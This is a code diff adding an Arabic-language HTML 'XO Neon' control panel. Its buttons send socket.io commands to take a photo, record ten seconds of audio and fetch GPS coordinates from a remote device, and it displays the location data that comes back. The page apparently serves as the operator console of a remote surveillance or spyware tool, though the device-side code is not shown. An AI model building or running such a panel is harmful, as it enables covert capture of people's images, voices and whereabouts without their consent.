@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Control Panel</title>
+    <style>
+        body { background-color: #0a0a0b; color: #00f2ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; }
+        .container { margin-top: 50px; }
+        h1 { text-shadow: 0 0 10px #00f2ff; margin-bottom: 30px; }
+        .btn {
+            background: transparent; border: 2px solid #00f2ff; color: #00f2ff;
+            padding: 15px 40px; margin: 15px; cursor: pointer; font-size: 1.2rem;
+            border-radius: 10px; transition: 0.3s; box-shadow: 0 0 5px #00f2ff;
+        }
+        .btn:hover { background: #00f2ff; color: #000; box-shadow: 0 0 20px #00f2ff; }
+        #status { color: #ff0077; margin-top: 20px; font-weight: bold; }
+        #location-data { background: #1a1a1d; padding: 20px; border-radius: 10px; display: inline-block; margin-top: 20px; border: 1px solid #333; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>لوحة تحكم XO Neon</h1>
+        
+        <button class="btn" onclick="sendCommand('take_photo')">📸 التقاط صورة</button><br>
+        <button class="btn" onclick="sendCommand('record_audio')">🎙️ تسجيل صوت (10ث)</button><br>
+        <button class="btn" onclick="sendCommand('get_location')">📍 تحديد الموقع</button>
+
+        <p id="status">الحالة: جاهز لإرسال الأوامر</p>
+
+        <div id="location-data">
+            <strong>بيانات الموقع:</strong>
+            <p id="loc-text">لم يتم استلام بيانات بعد</p>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+
+        function sendCommand(cmd) {
+            socket.emit('admin_command', { command: cmd });
+            document.getElementById('status').innerText = "تم إرسال أمر: " + cmd;
+            document.getElementById('status').style.color = "#00ff88";
+        }
+
+        socket.on('display_location', (data) => {
+            document.getElementById('loc-text').innerText = 
+                `خط العرض: ${data.lat} | خط الطول: ${data.lon}`;
+        });
+    </script>
+</body>
+</html>
